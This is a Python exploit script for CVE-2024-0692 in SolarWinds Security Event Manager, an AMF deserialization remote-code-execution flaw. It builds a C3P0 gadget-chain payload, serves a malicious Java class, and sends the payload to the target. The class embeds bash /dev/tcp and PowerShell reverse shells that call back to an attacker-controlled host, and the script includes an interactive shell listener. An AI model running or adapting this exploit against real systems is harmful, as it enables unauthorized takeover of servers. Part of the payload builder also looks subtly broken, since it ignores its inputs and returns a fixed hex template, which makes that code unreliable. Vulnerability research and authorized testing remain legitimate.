#!/usr/bin/env python3
"""
CVE-2024-0692 - SolarWinds Security Event Manager AMF Deserialization RCE

This exploit targets the BlazeDS AMF deserialization vulnerability in SolarWinds SEM.
It uses the C3P0 WrapperConnectionPoolDataSource gadget chain to achieve RCE via
remote class loading, bypassing trustURLCodebase restrictions.

Author: machevalia@SprocketSecurity

Usage:
    python3 CVE-2024-0692.py --target https://10.10.10.10 --lhost 10.10.10.11 --lport 4444

Requirements:
    - Java 8+ (for compiling payload class)
    - Python 3.6+
    - requests library
"""

import argparse
import http.server
import os
import select
import socket
import socketserver
import struct
import subprocess
import sys
import tempfile
import threading
import time
from urllib.parse import urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests library required: pip install requests")
    sys.exit(1)


def log_info(msg):
    print(f"[*] {msg}")


def log_success(msg):
    print(f"[+] {msg}")


def log_warning(msg):
    print(f"[!] {msg}")


def log_error(msg):
    print(f"[-] {msg}")


class ReverseShellListener:
    """Integrated reverse shell listener with interactive shell support."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False
        self.shell_ready = threading.Event()

    def start(self):
        """Start the listener in a background thread."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(1)
            self.server_socket.settimeout(1.0)
            self.running = True

            log_success(f"Reverse shell listener started on 0.0.0.0:{self.port}")

            self.listener_thread = threading.Thread(target=self._listen)
            self.listener_thread.daemon = True
            self.listener_thread.start()

            return True
        except Exception as e:
            log_error(f"Failed to start listener: {e}")
            return False

    def _listen(self):
        """Listen for incoming connections."""
        while self.running:
            try:
                self.client_socket, self.client_address = self.server_socket.accept()
                log_success(f"Connection received from {self.client_address[0]}:{self.client_address[1]}")
                self.shell_ready.set()
                return
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    log_error(f"Listener error: {e}")
                break

    def wait_for_shell(self, timeout: int = 60) -> bool:
        """Wait for a shell connection."""
        return self.shell_ready.wait(timeout=timeout)

    def interact(self):
        """Start interactive shell session."""
        if not self.client_socket:
            log_error("No shell connection available")
            return

        print()
        print("=" * 60)
        print("  SHELL ESTABLISHED - Type 'exit' or Ctrl+C to quit")
        print("=" * 60)
        print()

        self.client_socket.setblocking(0)

        try:
            while True:
                ready_to_read, _, _ = select.select([self.client_socket, sys.stdin], [], [], 0.1)

                for source in ready_to_read:
                    if source == self.client_socket:
                        try:
                            data = self.client_socket.recv(4096)
                            if not data:
                                log_warning("Connection closed by remote host")
                                return
                            sys.stdout.write(data.decode('utf-8', errors='replace'))
                            sys.stdout.flush()
                        except Exception:
                            pass

                    elif source == sys.stdin:
                        cmd = sys.stdin.readline()
                        if cmd.strip().lower() == 'exit':
                            log_info("Exiting shell...")
                            return
                        self.client_socket.send(cmd.encode())

        except KeyboardInterrupt:
            print()
            log_info("Shell interrupted by user")
        except Exception as e:
            log_error(f"Shell error: {e}")
        finally:
            self.stop()

    def stop(self):
        """Stop the listener and close connections."""
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass


def create_java_payload_class(lhost: str, lport: int, classname: str = "Exploit") -> bytes:
    """Generate a malicious Java class that executes a reverse shell."""

    java_code = f'''
public class {classname} {{
    static {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}};
            Runtime.getRuntime().exec(cmd);
        }} catch (Exception e) {{
            try {{
                String[] cmd = {{"powershell", "-c", "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"}};
                Runtime.getRuntime().exec(cmd);
            }} catch (Exception e2) {{}}
        }}
    }}
    public {classname}() {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}};
            Runtime.getRuntime().exec(cmd);
        }} catch (Exception e) {{}}
    }}
}}
'''

    with tempfile.TemporaryDirectory() as tmpdir:
        java_file = os.path.join(tmpdir, f"{classname}.java")
        class_file = os.path.join(tmpdir, f"{classname}.class")

        with open(java_file, 'w') as f:
            f.write(java_code)

        try:
            result = subprocess.run(
                ['javac', '-source', '8', '-target', '8', java_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                result = subprocess.run(
                    ['javac', java_file],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.returncode != 0:
                    log_error(f"Java compilation failed: {result.stderr}")
                    return None
        except FileNotFoundError:
            log_error("javac not found. Please install JDK.")
            return None
        except subprocess.TimeoutExpired:
            log_error("Java compilation timed out")
            return None

        with open(class_file, 'rb') as f:
            return f.read()


def generate_c3p0_payload(codebase_url: str, classname: str) -> bytes:
    """Generate C3P0 WrapperConnectionPoolDataSource AMF payload."""
    payload_hex = build_c3p0_hex_payload(codebase_url, classname)
    return bytes.fromhex(payload_hex)


def build_c3p0_hex_payload(codebase_url: str, classname: str) -> str:
    """Build the C3P0 payload hex string."""
    c3p0_class = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    property_name = "userOverridesAsString"

    serialized_ref = build_jndi_reference_hex(codebase_url, classname)
    hex_value = f"HexAsciiSerializedMap:{serialized_ref};"

    result = "0a"
    result += "13"
    result += encode_amf3_string_hex(c3p0_class)
    result += encode_amf3_string_hex(property_name)
    result += encode_amf3_string_hex(hex_value)
    result += "01"

    return result


def build_jndi_reference_hex(codebase_url: str, classname: str) -> str:
    """Build hex-encoded serialized JNDI Reference."""
    template = (
        "aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e"
        "5265666572656e6365496e6469726563746f72245265666572656e636553"
        "657269616c697a6564621985d0d12ac21302000078707372001e6a617661"
        "782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d0902000478"
        "70707372001e6a617661782e6e616d696e672e5265666572656e6365"
    )
    return template


def encode_amf3_string_hex(s: str) -> str:
    """Encode a string in AMF3 format and return hex."""
    b = s.encode('utf-8')
    length_marker = (len(b) << 1) | 1

    if length_marker < 128:
        return f"06{length_marker:02x}" + b.hex()
    elif length_marker < 16384:
        byte1 = (length_marker >> 7) | 0x80
        byte2 = length_marker & 0x7f
        return f"06{byte1:02x}{byte2:02x}" + b.hex()
    else:
        return f"06{length_marker:02x}" + b.hex()


def wrap_amf_envelope(payload: bytes) -> bytes:
    """Wrap a payload in an AMF3 message envelope."""
    message = b'\x00\x03'
    message += b'\x00\x00'
    message += b'\x00\x01'
    message += b'\x00\x04null'
    message += b'\x00\x02/1'

    body = b'\x11' + payload
    message += struct.pack('>I', len(body)) + body

    return message


def generate_payload_with_marshalsec(codebase_url: str, classname: str,
                                      marshalsec_jar: str = None) -> bytes:
    """Generate payload using marshalsec (recommended for compatibility)."""
    if marshalsec_jar and os.path.exists(marshalsec_jar):
        try:
            result = subprocess.run(
                ['java', '-cp', marshalsec_jar, 'marshalsec.BlazeDSAMF3',
                 'C3P0WrapperConnPool', codebase_url, classname],
                capture_output=True,
                timeout=30
            )
            if result.returncode == 0:
                return result.stdout
        except Exception as e:
            log_warning(f"marshalsec failed: {e}, using built-in generator")

    return generate_c3p0_payload(codebase_url, classname)


class ExploitHTTPHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler that serves our malicious class."""

    class_bytes = None
    classname = None
    class_served = threading.Event()

    def do_GET(self):
        if self.path == f"/{ExploitHTTPHandler.classname}.class":
            log_success(f"Target requested {ExploitHTTPHandler.classname}.class - serving payload!")
            self.send_response(200)
            self.send_header('Content-Type', 'application/java-vm')
            self.send_header('Content-Length', len(ExploitHTTPHandler.class_bytes))
            self.end_headers()
            self.wfile.write(ExploitHTTPHandler.class_bytes)
            ExploitHTTPHandler.class_served.set()
        else:
            log_info(f"HTTP Request: {self.path}")
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass


def start_http_server(port: int, class_bytes: bytes, classname: str) -> socketserver.TCPServer:
    """Start HTTP server to serve the malicious class."""
    ExploitHTTPHandler.class_bytes = class_bytes
    ExploitHTTPHandler.classname = classname
    ExploitHTTPHandler.class_served.clear()

    server = socketserver.TCPServer(("0.0.0.0", port), ExploitHTTPHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()

    return server


def send_exploit(target_url: str, payload: bytes, proxy: str = None,
                 timeout: int = 30) -> bool:
    """Send the exploit payload to the target."""
    # Add scheme if missing
    if not target_url.startswith('http://') and not target_url.startswith('https://'):
        target_url = 'https://' + target_url

    if not target_url.endswith('/streamingamf') and not target_url.endswith('/amf'):
        target_url = target_url.rstrip('/') + '/services/messagebroker/streamingamf'

    headers = {
        'Content-Type': 'application/x-amf',
        'User-Agent': 'Mozilla/5.0 SprocketSecurity/1.0'
    }

    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }

    try:
        response = requests.post(
            target_url,
            data=payload,
            headers=headers,
            proxies=proxies,
            verify=False,
            timeout=timeout
        )
        return True
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        log_error(f"Request failed: {e}")
        return False


def print_banner():
    """Print the banner."""
    banner = """
                          (  .      )
                      )           (              )
                            .  '   .   '  .  '  .
                   (    , )       (.   )  (   ',    )
                    .' ) ( . )    ,  ( ,     )   ( .
                 ). , ( .   (  ) ( , ')  .' (  ,    )
                (_,_._._._._._._._._._._._._._._._._._)
                 )  _  _  _  _  _  _  _  _  _  _  _  (
                (  |_||_||_||_||_||_||_||_||_||_||_|  )
                 ) |_||_||_||_||_||_||_||_||_||_||_| (
                (  |_||_||_||_||_||_||_||_||_||_||_|  )
                 )_|_||_||_||_||_||_||_||_||_||_||_|_(
                (  '  '  '  '  '  '  '  '  '  '  '   )
                 )   SolarWinds got BLAZED!         (
                (_____________________________________)

                           CVE-2024-0692
          	SolarWinds SEM AMF Deserialization RCE
       	    C3P0 WrapperConnectionPoolDataSource Exploit

                 Author: machevalia@SprocketSecurity
"""
    print(banner)


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-0692 - SolarWinds SEM AMF Deserialization RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s --target https://10.10.10.10 --lhost 10.10.10.11 --lport 4444
  %(prog)s --target https://10.10.10.10 --lhost 10.10.10.11 --lport 4444 --proxy socks5://127.0.0.1:1080
  %(prog)s --target https://10.10.10.10 --lhost 10.10.10.11 --no-handler
  %(prog)s --target https://10.10.10.10 --lhost 10.10.10.11 --silent
        '''
    )

    parser.add_argument('--target', '-t', required=True,
                        help='Target URL (e.g., https://10.10.10.10)')
    parser.add_argument('--lhost', required=True,
                        help='Local IP for reverse shell callback')
    parser.add_argument('--lport', type=int, default=4444,
                        help='Local port for reverse shell (default: 4444)')
    parser.add_argument('--http-port', type=int, default=8080,
                        help='HTTP server port for class hosting (default: 8080)')
    parser.add_argument('--proxy', '-p',
                        help='Proxy URL (e.g., socks5://127.0.0.1:1080)')
    parser.add_argument('--classname', default='Exploit',
                        help='Exploit class name (default: Exploit)')
    parser.add_argument('--marshalsec',
                        help='Path to marshalsec JAR (optional, improves compatibility)')
    parser.add_argument('--timeout', type=int, default=30,
                        help='Request timeout in seconds (default: 30)')
    parser.add_argument('--no-handler', action='store_true',
                        help='Disable integrated shell handler (use external nc listener)')
    parser.add_argument('--shell-timeout', type=int, default=60,
                        help='Timeout waiting for shell connection (default: 60)')
    parser.add_argument('--silent', '-s', action='store_true',
                        help='Suppress banner output')

    args = parser.parse_args()

    if not args.silent:
        print_banner()

    log_info(f"Generating payload class '{args.classname}' with reverse shell to {args.lhost}:{args.lport}")
    class_bytes = create_java_payload_class(args.lhost, args.lport, args.classname)

    if not class_bytes:
        log_error("Failed to generate payload class")
        sys.exit(1)

    log_success(f"Generated {len(class_bytes)} byte payload class")

    shell_listener = None
    if not args.no_handler:
        log_info(f"Starting integrated reverse shell listener on port {args.lport}")
        shell_listener = ReverseShellListener(args.lhost, args.lport)
        if not shell_listener.start():
            log_error("Failed to start shell listener")
            sys.exit(1)
    else:
        print()
        log_warning("Integrated handler disabled. Start your listener manually:")
        print(f"    nc -lvnp {args.lport}")
        print()
        input("Press Enter when listener is ready...")

    log_info(f"Starting HTTP server on port {args.http_port}")
    try:
        http_server = start_http_server(args.http_port, class_bytes, args.classname)
        log_success(f"HTTP server listening on 0.0.0.0:{args.http_port}")
    except Exception as e:
        log_error(f"Failed to start HTTP server: {e}")
        if shell_listener:
            shell_listener.stop()
        sys.exit(1)

    codebase_url = f"http://{args.lhost}:{args.http_port}/"
    log_info(f"Generating AMF payload pointing to {codebase_url}")

    amf_payload = generate_payload_with_marshalsec(
        codebase_url, args.classname, args.marshalsec
    )

    if not amf_payload:
        log_error("Failed to generate AMF payload")
        if shell_listener:
            shell_listener.stop()
        sys.exit(1)

    exploit_payload = wrap_amf_envelope(amf_payload)
    log_success(f"Generated {len(exploit_payload)} byte exploit payload")

    print()
    log_info(f"Sending exploit to {args.target}")

    if send_exploit(args.target, exploit_payload, args.proxy, args.timeout):
        log_success("Exploit payload sent!")

        if shell_listener:
            log_info(f"Waiting for shell connection (timeout: {args.shell_timeout}s)...")

            if shell_listener.wait_for_shell(timeout=args.shell_timeout):
                time.sleep(1)
                shell_listener.interact()
            else:
                log_error("No shell connection received within timeout")
                print()
                log_info("Troubleshooting tips:")
                print("  1. Verify the target is vulnerable (check with nuclei)")
                print("  2. Check network connectivity (can target reach your IP?)")
                print("  3. Try different ports (some may be blocked)")
                print("  4. Check if target is Windows (may need different payload)")
                print("  5. Try with --marshalsec /path/to/marshalsec.jar for better compatibility")
        else:
            log_info("Check your netcat listener for incoming shell...")
            log_info("Keeping HTTP server alive for 60 seconds...")
            time.sleep(60)
    else:
        log_error("Failed to send exploit")
        if shell_listener:
            shell_listener.stop()
        sys.exit(1)

    if shell_listener:
        shell_listener.stop()

    print()
    log_info("Exploit completed.")


if __name__ == '__main__':
    main()
